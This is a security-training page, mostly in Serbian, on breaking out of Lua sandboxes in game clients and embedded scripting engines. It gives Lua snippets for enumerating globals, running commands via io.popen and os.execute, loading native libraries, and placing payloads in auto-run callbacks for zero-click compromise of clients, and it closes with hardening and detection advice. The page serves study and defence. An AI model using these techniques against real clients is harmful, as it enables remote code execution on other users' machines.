# Bypass Lua sandboxes (embedded VMs, game clients)

{{#include ../../../banners/hacktricks-training.md}}

Ova stranica prikuplja praktične tehnike za enumeraciju i izbijanje iz Lua "sandboxes" ugrađenih u aplikacije (posebno game clients, plugins, ili in-app scripting engines). Mnogi engine-i izlažu ograničeno Lua okruženje, ali ostavljaju moćne globals dostupnim, što omogućava izvršavanje proizvoljnih komandi ili čak native memory corruption kada su bytecode loaders izloženi.

Key ideas:
- Posmatrajte VM kao nepoznato okruženje: enumerišite _G i otkrijte koje opasne primitive su dostupne.
- Kada su stdout/print blokirani, zloupotrebite bilo koji in-VM UI/IPC kanal kao output sink za posmatranje rezultata.
- Ako su io/os izloženi, često imate direktno izvršavanje komandi (io.popen, os.execute).
- Ako su load/loadstring/loadfile izloženi, izvršavanje pažljivo kreiranog Lua bytecode-a može potkopati sigurnost memorije u nekim verzijama (≤5.1 verifikatori se mogu zaobići; 5.2 je uklonio verifier), omogućavajući naprednu eksploataciju.

## Enumerate the sandboxed environment

- Dump globalnog okruženja da inventarišete dostupne tables/functions:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- Ako print() nije dostupan, preusmeri in-VM kanale. Primer iz MMO housing script VM gde chat izlaz radi samo nakon poziva zvuka; sledeći kod gradi pouzdanu funkciju za ispis:
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Generalizujte ovaj obrazac za vaš target: svaki textbox, toast, logger, ili UI callback koji prihvata stringove može da služi kao stdout za reconnaissance.

## Direct command execution if io/os is exposed

Ako sandbox i dalje izlaže standardne biblioteke io ili os, verovatno odmah dobijate command execution:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
Napomene:
- Izvršavanje se dešava unutar client process; mnogi anti-cheat/antidebug slojevi koji blokiraju external debuggers neće sprečiti in-VM process creation.
- Takođe proveri: package.loadlib (arbitrary DLL/.so loading), require with native modules, LuaJIT's ffi (if present), and the debug library (can raise privileges inside the VM).

## Zero-click triggers via auto-run callbacks

Ako host application pushes scripts to clients and the VM exposes auto-run hooks (e.g., OnInit/OnLoad/OnEnter), place your payload there for drive-by compromise as soon as the script loads:
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Bilo koji ekvivalentni callback (OnLoad, OnEnter, etc.) generalizuje ovu tehniku kada se skripte automatski prenose i izvršavaju na klijentu.

## Opasne primitive za traženje tokom recon

Tokom enumeracije _G, posebno obratite pažnju na:
- io, os: io.popen, os.execute, rad sa fajlovima (file I/O), pristup env varijablama (env access).
- load, loadstring, loadfile, dofile: izvršavaju izvor ili bytecode; omogućavaju učitavanje nepouzdanog bytecode-a.
- package, package.loadlib, require: dinamičko učitavanje biblioteka i površina modula.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo i hooks.
- LuaJIT-only: ffi.cdef, ffi.load za direktno pozivanje nativnog koda.

Minimalni primeri upotrebe (ako su dostižni):
```lua
-- Execute source/bytecode
local f = load("return 1+1")
print(f()) -- 2

-- loadstring is alias of load for strings in 5.1
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Opcionalna eskalacija: zloupotreba Lua bytecode loaders

Kada su load/loadstring/loadfile dostupni, ali su io/os ograničeni, izvršavanje pažljivo izrađenog Lua bytecode-a može dovesti do otkrivanja memorije i primitiva za korupciju. Ključne činjenice:
- Lua ≤ 5.1 je isporučivao bytecode verifier koji ima poznate bypasses.
- Lua 5.2 je potpuno uklonio verifier (službeni stav: aplikacije treba da odbijaju precompiled chunks), što proširuje površinu napada ako bytecode loading nije zabranjen.
- Tipični tokovi rada: leak pointers via in-VM output, craft bytecode to create type confusions (npr. oko FORLOOP ili drugih opcode-ova), zatim pivot na arbitrary read/write ili native code execution.

Ovaj put je specifičan za engine/verziju i zahteva RE. Pogledajte references za dubinske analize, exploitation primitives i primerke gadgetry u igrama.

## Beleške za detekciju i ojačavanje (za odbranu)

- Na serverskoj strani: odbaciti ili prepisati user scripts; allowlist safe APIs; ukloniti ili bind-empty io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi.
- Na klijentskoj strani: pokretati Lua sa minimalnim _ENV, zabraniti bytecode loading, ponovo uvesti strogi bytecode verifier ili provere potpisa, i blokirati kreiranje procesa iz klijentskog procesa.
- Telemetrija: alarmirati pri gameclient → child process creation ubrzo nakon učitavanja skripte; korrelirati sa UI/chat/script događajima.

## References

- [This House is Haunted: a decade old RCE in the AION client (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws](https://memorycorruption.net/posts/rce-lua-factorio/)
- [lua-l (2009): Discussion on dropping the bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [Exploiting Lua 5.1 bytecode (gist with verifier bypasses/notes)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)

{{#include ../../../banners/hacktricks-training.md}}
